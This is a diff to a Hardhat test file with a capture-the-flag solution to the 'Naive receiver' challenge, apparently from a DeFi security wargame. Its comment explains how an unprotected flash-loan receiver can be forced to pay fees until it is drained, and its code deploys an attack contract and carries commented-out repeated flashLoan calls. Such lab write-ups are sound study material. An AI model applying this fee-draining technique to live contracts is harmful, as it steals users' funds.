@@ -36,8 +36,35 @@ describe('[Challenge] Naive receiver', function () {
         ).to.eq(ETHER_IN_RECEIVER);
     });
 
+    /**
+     * The weakness of the FlashLoanReceiver is only check the the caller must be the pool, but who trigger the flashloan doesn't check. 
+     * So the malicious guy can trigger the flashloan. 
+     * When trigger the flashloan, input the receiver as the FlashLoanReceiver instance, amout as 0. the result is the FlashLoanReceiver instance must return
+     * 1 eth. repeat this actions 10 times. than the FlashLoanReceiver instance transfer all 10 eth to pool.
+     * 
+     * The standard onFlashLoan of the  FlashBorrower should check only the this borrower can trigger the flashloan 
+     * 
+     */
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContractFactory = await ethers.getContractFactory('NaiveReceiverAttackContract', deployer);
+        
+        const attackContract = await attackContractFactory.deploy();
+
+        await attackContract.connect(player).attack(pool.address,receiver.address);
+
+
+        // const ETH = await pool.ETH();
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//1
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//2
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//3
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//4
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//5
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//6
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//7
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//8
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//9
+        // await pool.connect(player).flashLoan(receiver.address,ETH,0,"0x");//10
     });
 
     after(async function () {
@@ -50,5 +77,8 @@ describe('[Challenge] Naive receiver', function () {
         expect(
             await ethers.provider.getBalance(pool.address)
         ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
+        expect(
+            await ethers.provider.getTransactionCount(player.address),
+          ).to.equal(1, "must exploit in one transaction")
     });
 });
